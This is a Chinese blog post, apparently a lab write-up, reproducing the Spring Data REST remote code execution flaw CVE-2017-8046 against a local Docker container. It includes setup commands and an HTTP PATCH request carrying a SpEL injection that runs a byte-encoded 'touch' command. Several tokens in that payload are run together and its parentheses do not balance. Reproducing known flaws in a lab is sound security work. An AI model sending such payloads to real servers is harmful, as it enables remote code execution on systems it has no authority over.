---
title: Spring Data REST PATCH请求代码执行漏洞(CVE-2017-8046)
category: 
- 渗透测试
tags: 
- Pocsuite
- Docker
- 漏洞复现
---

### 漏洞概述

- [影响版本](https://pivotal.io/security/cve-2017-8046)

### 漏洞环境搭建

- 拉取镜像到本地

```bash
$ docker pull medicean/vulapps:s_spring_1
```

- 启动环境

```bash
$ docker run -d -p 8080:8080 medicean/vulapps:s_spring_1
```



<!-- more -->

### 漏洞利用

- 访问 `http://你的 IP 地址:端口号/`

![image-20201126155613913](https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20201126155613913.png)

- POST 请求添加一个数据

```http
POST /persons HTTP/1.1
Host: 127.0.0.1:8080
ontent-Type: application/json
Cache-Control: no-cache
{"firstName": "VulApps", "lastName": "VulApps"}
```

![image-20201126162021732](https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20201126162021732.png)

![image-20201126162052556](https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20201126162052556.png)

- 执行poc

```http
PATCH /persons/5 HTTP/1.1
Host: 127.0.0.1
Content-Type: application/json-patch+json
Cache-Control: no-cache
Content-Length: 220

[{"op":"replace","path":"T(java.lang.Runtime).getRuntime().exec(newjava.lang.String(newbyte[]{47,117,115,114,47,98,105,110,47,116,111,117,99,104,32,47,116,109,112,47,118,117,108,110}/lastName", "value": "vulapps-demo" }]
```

![image-20201126162129463](https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20201126162129463.png)

### 参考链接

[references](https://mp.weixin.qq.com/s/uTiWDsPKEjTkN6z9QNLtSA)

<!-- more -->